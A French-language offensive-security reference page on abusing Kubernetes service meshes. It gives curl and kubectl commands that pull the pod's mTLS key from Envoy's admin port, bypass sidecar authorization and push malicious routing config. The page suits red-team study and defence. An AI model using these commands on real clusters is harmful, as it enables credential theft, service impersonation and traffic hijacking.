---
title: "Abus du service mesh : retourner les sidecars et le plan de contrôle du mesh contre le trafic"
order: 3
description: "Un service mesh injecte un proxy sidecar dans les pods et route le trafic à travers lui sous un plan de contrôle. Les attaquants en abusent en lisant l'identité et les certificats émis du sidecar, en atteignant l'interface d'administration du proxy, en poussant du routage ou des filtres malveillants via le plan de contrôle, et en exploitant les chemins de contournement propres au mesh pour défaire l'authentification et le chiffrement qu'il est censé ajouter."
keywords:
  - service mesh
  - istio
  - envoy sidecar
  - mtls
  - control plane
---

# Abus du service mesh

Un service mesh tel qu'Istio ou Linkerd ajoute un proxy sidecar (couramment Envoy) à chaque pod et route le trafic du pod à travers lui, avec un plan de contrôle distribuant la configuration, les identités et les certificats mutual-TLS. Le mesh est censé ajouter authentification, chiffrement et politique, mais il ajoute aussi de la surface. Le sidecar détient l'identité mesh et les certificats du pod, expose une interface d'administration et obéit à la configuration poussée par le plan de contrôle, de sorte qu'un attaquant lit l'identité, atteint le port d'administration ou pousse du routage et des filtres malveillants, et exploite les chemins qui contournent le mesh pour défaire entièrement ses contrôles.

Détectez le mesh et inspectez le sidecar :

```bash
kubectl get pods -A -o jsonpath='{..image}' | tr ' ' '\n' | grep -iE 'istio|envoy|linkerd' | sort -u
# the Envoy sidecar admin interface is typically on localhost:15000
curl -s http://127.0.0.1:15000/server_info | head
curl -s http://127.0.0.1:15000/certs                   # the pod's mesh certificates/keys
curl -s http://127.0.0.1:15000/config_dump | head      # the full proxy config and routes
```

## Contournements

```bash
# 1. steal the pod's mesh identity and private key from the sidecar admin or SDS
curl -s http://127.0.0.1:15000/certs                   # mTLS cert + key the pod uses
# 2. bypass the mesh: talk to a target pod's app port directly, skipping the sidecar
#    (mesh policy is enforced by the proxy; a direct connection to the real pod IP
#     on the app port, where the app also listens, evades mTLS and authz)
curl -s http://<target-pod-ip>:<app-port>/
# 3. with control-plane access (Istio CRDs via the API), push malicious config:
#    a VirtualService re-routing traffic, or an EnvoyFilter injecting a Lua filter
kubectl apply -f malicious-virtualservice.yaml 2>/dev/null
```

## Notes d'exploitation

- L'interface d'administration du sidecar (Envoy sur 15000) est une cible locale riche depuis un pod compromis : `/certs` livre l'identité mesh et la clé du pod, et `/config_dump` cartographie chaque route et politique.
- Le mTLS et l'autorisation du mesh sont appliqués par le proxy, de sorte qu'une connexion directe au véritable port applicatif d'une cible les contourne là où l'application elle-même n'exige pas également l'identité mesh ; cela défait le contrôle d'accès du mesh.
- L'accès au plan de contrôle via les CRD du mesh (VirtualService, EnvoyFilter, AuthorizationPolicy) permet à un attaquant de rerouter le trafic, d'injecter des filtres de requête ou de désactiver la politique à l'échelle du cluster ; cela nécessite le RBAC pour écrire ces objets, donc cela s'enchaîne depuis les voies d'escalade.
- Voler le certificat du sidecar permet à un attaquant d'usurper l'identité mesh du pod auprès d'autres services qui lui font confiance.

## Références

- [Istio: security architecture](https://istio.io/latest/docs/concepts/security/)
- [Envoy: admin interface](https://www.envoyproxy.io/docs/envoy/latest/operations/admin)
- [Linkerd: security](https://linkerd.io/2/features/automatic-mtls/)
